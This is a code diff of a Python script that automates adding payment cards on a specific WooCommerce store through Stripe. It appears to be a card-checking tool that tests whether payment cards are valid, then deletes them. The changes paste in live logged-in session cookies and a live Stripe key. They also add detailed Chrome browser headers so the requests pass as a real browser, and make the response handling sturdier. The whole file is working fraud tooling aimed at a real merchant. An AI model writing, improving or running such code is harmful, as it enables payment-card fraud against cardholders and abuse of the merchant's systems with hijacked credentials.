@@ -21,7 +21,7 @@ USERS_FILE = "allowed_users.txt"
 # Target Site Config
 SITE_URL = "https://infiniteautowerks.com"
 PUBLISHABLE_KEY = "pk_live_51MwcfkEreweRX4nmunyHnVjt6qSmKUgaafB7msRfg4EsQrStC8l0FlevFiuf2vMpN7oV9B5PGmIc7uNv1tdnvnTv005ZJCfrCk"
-COOKIES = """wordpress_sec_e7182569f4777e7cdbb9899fb576f3eb=hbjgyhtfr%7C1768803658%7CYqxUeXNjAKwu20bDX2VG2kndYvX3RbKMYY5BIzFEdCl%7C14873263ec0ace12b4c8926c1472fb012761f36b0d1dcfe2e7df480516bed7b5; wordpress_logged_in_e7182569f4777e7cdbb9899fb576f3eb=hbjgyhtfr%7C1768803658%7CYqxUeXNjAKwu20bDX2VG2kndYvX3RbKMYY5BIzFEdCl%7Ced82f62145a463255c68d252f811c3baaa30f700a9a0ec76d330611126f019de"""
+COOKIES = """wordpress_sec_e7182569f4777e7cdbb9899fb576f3eb=gtfr%7C1770178761%7C1Z4vr5jEPFY8BnVkhQUxKqJb9AHn8KtA1WAiYPOpgNk%7Cbab8b45235d97384da36d63a3d3156a322f8d00c5553908e4798e800bcf6baf3; checkout_continuity_service=18e8439a-8c0a-4282-baa5-c8730e006a98; tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; tk_ai=6sMD0NBiyoixEIz1kD7cwKDv; __stripe_mid=a7dc99f3-7ed5-4c61-a39f-d169213f19fda0531d; wordpress_logged_in_e7182569f4777e7cdbb9899fb576f3eb=gtfr%7C1770178761%7C1Z4vr5jEPFY8BnVkhQUxKqJb9AHn8KtA1WAiYPOpgNk%7Cd10c4724e23442755b948c7ceeb887a8fccbf1ed7fc48f4825357624211b1d71; __cf_bm=Y9a_kVSS_6rHH_WpFqvvL4gpvXqT0hxjL9nT4EP5wmA-1769142171-1.0.1.1-oukQTL.0IOntwz67yM69e2YmiFI14iCOYxnlhTquR_B2TPVQjYRXsQfL9vnJICcCf2TNl3bRgzV0PrnzI4sZnah.sPtijy6m8egKoB3dn4o; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-23%2003%3A52%3A53%7C%7C%7Cep%3Dhttps%3A%2F%2Finfiniteautowerks.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-23%2003%3A52%3A53%7C%7C%7Cep%3Dhttps%3A%2F%2Finfiniteautowerks.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F143.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Finfiniteautowerks.com%2Fmy-account%2Fadd-payment-method%2F; tk_qs=; __stripe_sid=81772e11-a027-4b3a-8f62-dfd1da3c8b46d319a9"""
 
 # Auto-delete cards after check (set to False to keep cards)
 AUTO_DELETE_CARDS = True
@@ -253,8 +253,18 @@ class StripeWooCommerceAutomation:
         url = "https://api.stripe.com/v1/payment_methods"
         headers = {
             'accept': 'application/json',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7',
             'content-type': 'application/x-www-form-urlencoded',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+            'origin': 'https://js.stripe.com',
+            'priority': 'u=1, i',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36'
         }
         session_ids = self._generate_session_ids()
         data = {
@@ -269,7 +279,7 @@ class StripeWooCommerceAutomation:
             'guid': session_ids['guid'],
             'muid': session_ids['muid'],
             'sid': session_ids['sid'],
-            'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020; payment-element; deferred-intent'
+            'payment_user_agent': 'stripe.js/43a1cb09b6; stripe-js-v3/43a1cb09b6; payment-element; deferred-intent'
         }
         try:
             response = requests.post(url, headers=headers, data=data, timeout=30)
@@ -289,10 +299,20 @@ class StripeWooCommerceAutomation:
     def confirm_setup_intent(self, payment_method_id, ajax_nonce):
         url = f"{self.site_url}/wp-admin/admin-ajax.php"
         headers = {
+            'accept': '*/*',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'x-requested-with': 'XMLHttpRequest',
-            'referer': f'{self.site_url}/my-account/add-payment-method/'
+            'origin': self.site_url,
+            'priority': 'u=1, i',
+            'referer': f'{self.site_url}/my-account/add-payment-method/',
+            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest'
         }
         data = {
             'action': 'wc_stripe_create_and_confirm_setup_intent',
@@ -309,14 +329,24 @@ class StripeWooCommerceAutomation:
             
             success = False
             if response.status_code == 200:
-                if isinstance(result.get('success'), bool):
-                    success = result.get('success')
-                elif result.get('data', {}).get('status') == 'succeeded':
-                    success = True
+                if isinstance(result, dict):
+                    if isinstance(result.get('success'), bool):
+                        success = result.get('success')
+                    elif result.get('data', {}).get('status') == 'succeeded':
+                        success = True
+                else:
+                    success = False
             
             error_msg = None
             if not success:
-                error_msg = result.get('data', {}).get('error', {}).get('message')
+                if isinstance(result, dict):
+                    data = result.get('data')
+                    if isinstance(data, dict):
+                        error_msg = data.get('error', {}).get('message')
+                    else:
+                        error_msg = f"Unknown error (data: {data})"
+                else:
+                    error_msg = f"Unexpected response format: {result}"
             
             return {'success': success, 'response': result, 'error_message': error_msg}
         except Exception as e:
